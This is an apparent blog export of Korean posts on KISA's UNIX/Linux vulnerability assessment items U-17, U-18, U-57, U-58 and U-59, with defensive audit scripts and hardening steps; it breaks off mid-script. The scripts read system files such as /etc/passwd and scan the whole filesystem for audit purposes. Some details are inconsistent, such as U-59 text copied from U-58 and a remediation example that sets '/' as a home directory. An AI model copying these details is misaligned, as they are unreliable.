<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">equivResult=<span class="string">&quot;&quot;</span></span><br><span class="line">rhostsResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`find / -name hosts.equiv`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        process2=`find <span class="string">&quot;<span class="variable">$process</span>&quot;</span> -user root`</span><br><span class="line">        <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process2</span>&quot;</span> ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">                process2=`find <span class="string">&quot;<span class="variable">$process</span>&quot;</span> -perm 601`</span><br><span class="line">                <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process2</span>&quot;</span> ]</span><br><span class="line">                <span class="keyword">then</span></span><br><span class="line">                        equivResult=취약</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                        process3=`cat <span class="string">&quot;<span class="variable">$process</span>&quot;</span> | grep <span class="string">&quot;+&quot;</span>`</span><br><span class="line">                        <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process3</span>&quot;</span> ]</span><br><span class="line">                        <span class="keyword">then</span></span><br><span class="line">                                equivResult=취약</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                                equivResult=양호</span><br><span class="line">                        <span class="keyword">fi</span></span><br><span class="line">                <span class="keyword">fi</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                equivResult=취약</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        equivResult=<span class="string">&quot;파일 없음&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">process=`find / -name .rhosts`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        process2=`find <span class="string">&quot;<span class="variable">$process</span>&quot;</span> -user root`</span><br><span class="line">        <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process2</span>&quot;</span> ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">                process2=`find <span class="string">&quot;<span class="variable">$process</span>&quot;</span> -perm 601`</span><br><span class="line">                <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process2</span>&quot;</span> ]</span><br><span class="line">                <span class="keyword">then</span></span><br><span class="line">                        rhostsResult=취약</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                        process3=`cat <span class="string">&quot;<span class="variable">$process</span>&quot;</span> | grep <span class="string">&quot;+&quot;</span>`</span><br><span class="line">                        <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process3</span>&quot;</span> ]</span><br><span class="line">                        <span class="keyword">then</span></span><br><span class="line">                                rhostsResult=취약</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                                rhostsResult=양호</span><br><span class="line">                        <span class="keyword">fi</span></span><br><span class="line">                <span class="keyword">fi</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                rhostsResult=취약</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        rhostsResult=<span class="string">&quot;파일 없음&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-17 [<span class="variable">$Home</span>/.rhosts, hosts.equiv 사용 금지]<span class="string">&quot;\n&quot;</span>[hosts.equiv] : <span class="string">&quot;<span class="variable">$equivResult</span>&quot;</span><span class="string">&quot;\n&quot;</span>[.rhosts] : <span class="string">&quot;<span class="variable">$rhostsResult</span>&quot;</span> | tee /root/result/u-17.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>hosts.equiv</code> <code>.rhosts</code>의 위치를 찾고 파일의 소유자와 권한, <code>+</code> 설정여부에 따라 <code>양호 / 취약</code> 처리해주었습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-17</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-17/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-18 접속 IP 및 포트 제한</title>
    <url>/2022/01/24/2022-01-24-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-18%20%EC%A0%91%EC%86%8D%20IP%20%EB%B0%8F%20%ED%8F%AC%ED%8A%B8%20%EC%A0%9C%ED%95%9C/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>허용할 호스트에 대한 접속 IP 주소 제한 및 포트 제한 설정 여부 점검입니다.</p>
<p>항목코드는 <code>U-18</code>이며, 항목 주요도는 <code>상</code>입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>허용할 호스트만 서비스를 사용하게 하여 서비스 취약점을 이용한 외부자 공격을 방지하기 위함입니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>허용할 호스트에 대한 IP 및 포트제한이 적용되지 않은 경우 Telnet, FTP같은 보안에 취약한 네트워크 서비스를 통하여 불법적인 접근 및 시스템 침해사고가 발생할 수 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : 접속을 허용할 특정 호스트에 대한 IP 주소 및 포트 제한을 설정한 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : 접속을 허용할 특정 호스트에 대한 IP 주소 및 포트 제한을 설정하지 않은 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX</td>
<td>1) TCP Warrper 사용할 경우<br />All deny 적용 확인 및 접근 허용 IP 적절성 확인<br />    <code># cat /etc/hosts.deny</code><br />    <code># cat /etc/hosts.allow</code><br /><br />2) IPtables 사용할 경우 (LINUX)<br />    <code># iptables -L</code><br /><br />3) IPfilter 사용할 경우 (SOLARIS)<br />    <code># cat /etc/ipf/ipf.conf</code><br /><br />4) TCP Warrper (SOLARIS 10 이상)<br />    <code># inetadm -p</code><br />    tcp wrappers=true ← 현재 실행되어 있는 상태<br />    tcp wrappers=false ← 현재 정지된 상태</td>
</tr>
<tr>
<td>HP-UX</td>
<td>All deny 적용 확인 및 서비스 접근 가능 IP 확인<br />    <code># cat /var/adm/inetd.sec</code></td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># cat /etc/hosts.deny</p>
<p># cat /etc/hosts.allow</p>
</blockquote>
<br>

<p><code>hosts.deny</code> <code>hosts.allow</code>파일을 확인해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-18/cat.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>Application</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>IPtables</td>
<td>1) <code>iptables</code> 명령어를 통해 접속할 IP 및 포트 정책 추가<br />(예) SSH 서비스 제한<br />    <code># iptables -A INPUT -p tcp -s 192.168.1.0/24 --dport 22 -j ACCEPT</code><br />    <code># iptables -A INPUT -p tcp --dport 22 -j DROP</code><br /><br />2) <code>iptables</code> 설정 저장<br />    <code># /etc/rc.d/init.d/iptables save</code></td>
</tr>
<tr>
<td>IPfilter</td>
<td>1) vi 편집기를 이용하여 <code>/etc/ipf/ipf.conf</code> 파일 열기<br /><br />2) 접속할 IP 및 포트 정책 추가<br />(예) SSH 서비스 제한<br />    pass in quick proto tcp from 192.168.1.0/24 to any port = 22 keep state<br />    block in quick proto tcp from any to any port = 22 keep state<br /><br />3) <code>IPfilter</code> 서비스 재시작</td>
</tr>
<tr>
<td>TCP Wrapper</td>
<td>1) vi 편집기를 이용하여 <code>/etc/hosts.deny</code> 파일 열기<br /><br />2) 아래와 같이 수정 또는 신규 삽입 (ALL Deny 설정)<br />    (수정 전) 설정 없음<br />    (수정 후) ALL:ALL<br /><br />3) vi 편집기를 이용하여 <code>/etc/hosts.allow</code> 파일 열기<br />    (수정 전) 설정 없음<br />    (수정 후) sshd : 192.168.0.148, 192.168.0.6<br /><br /><br /><strong>&lt; TCP Wrapper 접근제어 가능 서비스 &gt;</strong><br /><code>SYSTAT</code> <code>FINGER</code> <code>FTP</code> <code>TELNET</code> <code>RLOGIN</code> <code>RSH</code> <code>TALK</code> <code>EXEC</code> <code>TFTP</code> <code>SSH</code><br /><br /><strong>&lt; TCP Wrapper는 다음 두 파일에 의해 접근이 제어됨 &gt;</strong><br /><code>/etc/hosts.deny</code> → 시스템 접근을 제한할 IP 설정<br /><code>/etc/hosts.allow</code> → 시스템 접근을 허용할 IP 설정<br />위의 두 파일이 존재하지 않을 시 → 모든 접근 허용</td>
</tr>
<tr>
<td>HP-UX</td>
<td>HP-UX 서버의 경우 <code>/var/adm/inetd.sec</code> 파일을 이용하여 서버 자체적으로 접근제어를 할 수 있으며 해당 파일이 존재하지 않을 경우 <code>/usr/newconfig/var/adm/inetd.sec</code> 샘플 파일을 복사하여 사용함<br /><br />1) vi 편집기를 이용하여 <code>/var/adm/inetd.sec</code> 파일 열기<br /><br />2) 아래와 같이 수정 또는 신규 삽입 (ALL Deny 설정)<br />    <code>telnet</code>으로의 모든 접속 차단 → telnet deny *.*.*.*<br />    <code>telnet</code> 접속을 허용할 IP 등록 → telnet allow [telnet 접속 허용 IP 등록]</td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`cat /etc/hosts.deny | grep <span class="string">&quot;ALL:ALL&quot;</span>`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        ProcessResult=양호</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=취약</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-18 [접속 IP 및 포트 제한] : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> | tee /root/result/u-18.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>/etc/hosts.deny</code> 파일에 설정이 없을 경우 <code>취약</code>, 아니면 <code>양호</code> 처리해주었습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-18</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-18/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-57 홈디렉터리 소유자 및 권한 설정</title>
    <url>/2022/01/24/2022-01-24-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-57%20%ED%99%88%EB%94%94%EB%A0%89%ED%86%A0%EB%A6%AC%20%EC%86%8C%EC%9C%A0%EC%9E%90%20%EB%B0%8F%20%EA%B6%8C%ED%95%9C%20%EC%84%A4%EC%A0%95/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>홈 디렉터리의 소유자 외 타사용자가 해당 홈 디렉터리를 수정할 수 없도록 제한하는지 점검합니다.</p>
<p>항목코드는 <code>U-57</code>이며, 항목 주요도는 <code>중</code>입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>사용자 홈 디렉터리 내 설정파일이 비인가자에 의한 변조를 방지합니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>홈 디렉터리 내 설정파일 변조 시 정상적인 서비스 이용이 제한될 우려가 존재합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : 홈 디렉터리 소유자가 해당 계정이고 타 사용자 쓰기 권한이 제거된 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : 홈 디렉터리 소유자가 해당 계정이 아니고 타 사용자 쓰기 권한이 부여된  경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td><code>/etc/passwd</code> 파일에서 사용자별 홈 디렉터리 확인 후 소유자 및 권한 확인<br />    <code># cat /etc/passwd</code><br />    <code># ls -ald &lt;user-home-directory&gt;</code></td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># ls -ald /home/*</p>
</blockquote>
<br>

<p>사용자 계정들이 적절한 홈 디렉터리를 가지고 있는지 확인해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-57/ls.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td><code>/etc/passwd</code> 파일의 소유자 및 권한 변경<br />    <code># chown &lt;user_name&gt; &lt;user_home_directory&gt;</code><br />    <code># chmod o-w &lt;user_home_directory&gt;</code></td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">process=`ls -ald /home/*`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$process</span>&quot;</span> &gt; /root/result/u-57.txt</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-57 [홈디렉터리 소유자 및 권한 설정] : /root/result/u-57.txt 파일 확인</span><br></pre></td></tr></table></figure>

<br>

<p>사용자별 홈 디렉터리의 권한과 소유자를 <code>/root/result/u-57.txt</code> 파일에 입력해주었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-57/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-58 홈디렉터리로 지정한 디렉터리의 존재 관리</title>
    <url>/2022/01/24/2022-01-24-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-58%20%ED%99%88%EB%94%94%EB%A0%89%ED%84%B0%EB%A6%AC%EB%A1%9C%20%EC%A7%80%EC%A0%95%ED%95%9C%20%EB%94%94%EB%A0%89%ED%84%B0%EB%A6%AC%EC%9D%98%20%EC%A1%B4%EC%9E%AC%20%EA%B4%80%EB%A6%AC/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>사용자 계정과 홈 디렉터리의 일치 여부를 점검합니다.</p>
<p>항목코드는 <code>U-58</code>이며, 항목 주요도는 <code>중</code>입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p><code>/home</code> 이외 사용자의 홈 디렉터리 존재 여부를 점검하여 비인가자 시스템 명령어의 무단 사용을 방지하기 위함입니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p><code>passwd</code> 파일에 설정된 홈디렉터리가 존재하지 않는 경우 해당 계정으로 로그인시 홈디렉터리가 루트 디렉터리로 할당되어 접근이 가능합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : 홈 디렉터리가 존재하지 않는 계정이 발견되지 않는 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : 홈 디렉터리가 존재하지 않는 계정이 발견된 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td>사용자 계정 별 홈 디렉터리 지정 여부 확인<br />    <code># cat /etc/passwd</code></td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># cat /etc/passwd</p>
</blockquote>
<br>

<p><code>/etc/passwd</code> 파일 내 존재하는 모든 사용자 계정이 적절한 홈 디렉터리를 가지고 있는지 확인해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-58/cat.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td>1) 홈 디렉터리가 없는 사용자 계정 삭제<br />    SOLARIS, LINUX, HP-UX 설정 : <code># userdel &lt;user_name&gt;</code><br />    AIX 설정 : <code># rmuser &lt;user_name&gt;</code><br /><br />2) 홈 디렉터리가 없는 사용자 계정에 홈 디렉터리 지정<br />    <code># vi /etc/passwd</code><br />    <code># test:x:501:501::/:/bin/bash</code></td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">process=`cat /etc/passwd`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$process</span>&quot;</span> &gt; /root/result/u-58.txt</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-58 [홈디렉터리로 지정한 디렉터리의 존재 관리] : /root/result/u-58.txt 파일 확인</span><br></pre></td></tr></table></figure>

<br>

<p>사용자 계정 별 홈 디렉터리 지정 여부 목록을 <code>/root/result/u-58.txt</code> 파일에 입력해주었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-58/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-59 숨겨진 파일 및 디렉터리 검색 및 제거</title>
    <url>/2022/01/24/2022-01-24-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-59%20%EC%88%A8%EA%B2%A8%EC%A7%84%20%ED%8C%8C%EC%9D%BC%20%EB%B0%8F%20%EB%94%94%EB%A0%89%ED%84%B0%EB%A6%AC%20%EA%B2%80%EC%83%89%20%EB%B0%8F%20%EC%A0%9C%EA%B1%B0/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>숨긴 파일 및 디렉터리 내 의심스러운 파일 존재 여부 점검입니다.</p>
<p>항목코드는 <code>U-59</code>이며, 항목 주요도는 <code>하</code>입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>숨겨진 파일 및 디렉터리 중 의심스러운 내용은 정상 사용자가 아닌 공격자에 의해 생성되었을 가능성이 높음으로 이를 발견하여 제거합니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>공격자는 숨겨진 파일 및 디렉터리를 통해 시스템 정보 습득, 파일 임의 변경 등을 할 수 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : 불필요하거나 의심스러운 숨겨진 파일 및 디렉터리를 삭제한 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : 불필요하거나 의심스러운 숨겨진 파일 및 디렉터리를 방치한 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td>특정 디렉터리 내 불필요한 파일 점검<br />    <code># ls -al [디렉터리 명]</code><br /><br />전체 숨김 디렉터리 및 숨김 파일 점검<br />    <code># find / -type f -name &quot;.*&quot; (파일 점검)</code><br />    <code># find / -type d -name &quot;.*&quot; (디렉터리 점검)</code></td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># find / -type f -name &quot;.*&quot;</p>
<p># find / -type d -name &quot;.*&quot;</p>
</blockquote>
<br>

<p><code>/etc/passwd</code> 파일 내 존재하는 모든 사용자 계정이 적절한 홈 디렉터리를 가지고 있는지 확인해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-59/find_file.png">

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-59/find_dir.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td>1) 숨겨진 파일 목록에서 불필요한 파일 삭제<br /><br />2) 마지막으로 변경된 시간에 따라 최근 작업한 파일 확인 시 [-t] 플래그 사용</td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">process=`cat /dev/null`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$process</span>&quot;</span> &gt; /root/result/u-59.txt</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;U-59 [숨겨진 파일 및 디렉터리 검색 및 제거]&quot;</span> &gt;&gt; /root/result/u-59.txt</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[파일 점검]&quot;</span> &gt;&gt; /root/result/u-59.txt</span><br><span class="line">file=`find / -<span class="built_in">type</span> f -name <span class="string">&quot;.*&quot;</span>`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$file</span>&quot;</span> &gt;&gt; /root/result/u-59.txt</span><br><span class="line"><span 